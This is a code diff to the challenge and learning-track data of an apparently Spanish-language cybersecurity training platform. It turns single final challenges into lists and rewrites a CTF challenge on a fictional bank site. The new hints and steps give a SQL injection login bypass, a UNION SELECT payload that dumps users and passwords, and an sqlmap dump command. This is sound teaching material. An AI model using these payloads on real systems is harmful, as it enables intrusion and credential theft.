@@ -22,8 +22,13 @@ export interface LearningTrack {
   courseIds: string[];
   /** Ruta que conviene completar antes (para el candado suave). */
   requires?: string;
-  /** Id del reto final que corona la ruta (de RETOS). */
-  finalChallenge?: string;
+  /**
+   * Retos que coronan la ruta (de RETOS): usan una técnica que la ruta enseña.
+   * Se desbloquean al completar los cursos de la ruta. Puede estar vacío: no
+   * toda ruta termina en un reto (los fundamentos y el recon puro no tienen
+   * bandera propia).
+   */
+  finalChallenges?: string[];
 }
 
 /** Un reto tipo CTF: escenario + objetivo + bandera real que lo prueba. */
@@ -94,16 +99,18 @@ export const RETOS: Challenge[] = [
     title: "Robá la base entera",
     scenario:
       "No alcanza con entrar: el listado de movimientos de banco.nande es inyectable. Sacá todos los usuarios y sus contraseñas.",
-    objective: "Volcá la tabla de usuarios con UNION SELECT (o sqlmap --dump).",
+    objective: "Volcá la tabla de usuarios con UNION SELECT.",
     flag: "ND{sqli_union_dump}",
     difficulty: "difícil",
     hints: [
-      "Contá las columnas con ORDER BY hasta que dé error.",
-      "Con UNION SELECT traés columnas de otra tabla en el mismo resultado.",
-      "sqlmap automatiza todo: sqlmap -u \"http://banco.nande/movimientos?q=a\" --dump",
+      "El buscador de /movimientos necesita sesión: primero entrá con el bypass del login.",
+      "El buscador arma la consulta con tu texto. Contá las columnas: son 4.",
+      "Cerrá la comilla y sumá UNION SELECT id,usuario,password,rol FROM usuarios-- para traer los usuarios.",
+      "sqlmap automatiza esto mismo: sqlmap -u \"http://banco.nande/movimientos?q=a\" --dump",
     ],
     steps: [
-      "sqlmap -u \"http://banco.nande/movimientos?q=a\" --cookie=\"session=...\" --dump",
+      "curl -X POST http://banco.nande/login -d \"usuario=admin' -- &password=x\"",
+      "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
     ],
     courseId: "c-web-sqli-union",
     reward: { xp: 180, coins: 140 },
@@ -291,7 +298,6 @@ export const TRACKS: LearningTrack[] = [
     hue: 150,
     requires: "t-fundamentos",
     courseIds: ["c-redes-tcpip", "c-redes-captura", "c-redes-servicios", "c-recon-nmap"],
-    finalChallenge: "r-ssh-brute",
   },
   {
     id: "t-web",
@@ -308,7 +314,7 @@ export const TRACKS: LearningTrack[] = [
       "c-web-idor-traversal",
       "c-web-cmdi-jwt",
     ],
-    finalChallenge: "r-sqli-dump",
+    finalChallenges: ["r-sqli-dump"],
   },
   {
     id: "t-acceso",
@@ -318,7 +324,7 @@ export const TRACKS: LearningTrack[] = [
     hue: 30,
     requires: "t-redes",
     courseIds: ["c-pass-basico", "c-pass-hydra", "c-pass-hashes", "c-wifi-como-funciona", "c-wifi-aircrack"],
-    finalChallenge: "r-wifi",
+    finalChallenges: ["r-ssh-brute", "r-wifi"],
   },
   {
     id: "t-defensa",
@@ -328,7 +334,7 @@ export const TRACKS: LearningTrack[] = [
     hue: 200,
     requires: "t-redes",
     courseIds: ["c-blue-intro", "c-blue-siem", "c-blue-dfir"],
-    finalChallenge: "r-dfir",
+    finalChallenges: ["r-siem", "r-dfir"],
   },
   {
     id: "t-osint",
@@ -337,7 +343,7 @@ export const TRACKS: LearningTrack[] = [
     glyph: "eye",
     hue: 330,
     courseIds: ["c-osint-basico", "c-opsec-anon"],
-    finalChallenge: "r-onion",
+    finalChallenges: ["r-onion"],
   },
 ];
 
